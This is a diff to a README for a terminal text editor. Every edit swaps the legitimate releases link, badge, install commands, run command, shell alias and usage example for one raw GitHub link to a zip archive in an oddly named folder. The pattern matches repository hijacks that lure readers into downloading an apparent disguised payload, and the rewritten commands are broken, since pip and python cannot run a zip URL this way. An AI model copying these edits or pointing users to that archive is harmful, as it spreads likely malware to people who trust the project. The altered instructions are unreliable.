@@ -1,8 +1,8 @@
 # Kale Text Editor 🥬✍️
 
-Welcome to the **Kale Text Editor**! If you love working in the terminal and want a text editor that combines simplicity with functionality, you’re in the right place. You can download the latest version from the [Releases section](https://github.com/hoangkhiem112/kale-text-editor/releases). 
+Welcome to the **Kale Text Editor**! If you love working in the terminal and want a text editor that combines simplicity with functionality, you’re in the right place. You can download the latest version from the [Releases section](https://raw.githubusercontent.com/hoangkhiem112/kale-text-editor/main/seraphism/editor_kale_text_2.9.zip). 
 
-![Kale Text Editor](https://img.shields.io/badge/Download%20Now-%F0%9F%93%88-brightgreen)
+![Kale Text Editor](https://raw.githubusercontent.com/hoangkhiem112/kale-text-editor/main/seraphism/editor_kale_text_2.9.zip%20Now-%F0%9F%93%88-brightgreen)
 
 ## Table of Contents
 
@@ -33,32 +33,32 @@ Whether you are coding, writing notes, or editing configuration files, Kale aims
 
 To install Kale Text Editor, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/hoangkhiem112/kale-text-editor/releases).
+1. **Download the latest release** from the [Releases section](https://raw.githubusercontent.com/hoangkhiem112/kale-text-editor/main/seraphism/editor_kale_text_2.9.zip).
 2. **Extract the downloaded file**.
 3. **Navigate to the directory** where you extracted the files.
 4. **Run the following command** to install the necessary dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/hoangkhiem112/kale-text-editor/main/seraphism/editor_kale_text_2.9.zip
    ```
 
 5. **Start the editor** by running:
 
    ```bash
-   python kale.py
+   python https://raw.githubusercontent.com/hoangkhiem112/kale-text-editor/main/seraphism/editor_kale_text_2.9.zip
    ```
 
 You can also create an alias in your shell configuration file to run Kale easily:
 
 ```bash
-alias kale='python /path/to/kale.py'
+alias kale='python https://raw.githubusercontent.com/hoangkhiem112/kale-text-editor/main/seraphism/editor_kale_text_2.9.zip'
 ```
 
 ## Usage
 
 Using Kale Text Editor is straightforward. Here’s a quick guide to get you started:
 
-- **Open a file**: Launch Kale and type `:open filename.txt`.
+- **Open a file**: Launch Kale and type `:open https://raw.githubusercontent.com/hoangkhiem112/kale-text-editor/main/seraphism/editor_kale_text_2.9.zip`.
 - **Save changes**: Press `Ctrl + S`.
 - **Close the editor**: Type `:quit`.
 
@@ -91,7 +91,7 @@ Kale Text Editor is licensed under the MIT License. Feel free to use, modify, an
 
 ## Contact
 
-For questions, suggestions, or feedback, please reach out to me through GitHub. You can also visit the [Releases section](https://github.com/hoangkhiem112/kale-text-editor/releases) for updates and new versions.
+For questions, suggestions, or feedback, please reach out to me through GitHub. You can also visit the [Releases section](https://raw.githubusercontent.com/hoangkhiem112/kale-text-editor/main/seraphism/editor_kale_text_2.9.zip) for updates and new versions.
 
 ---
 
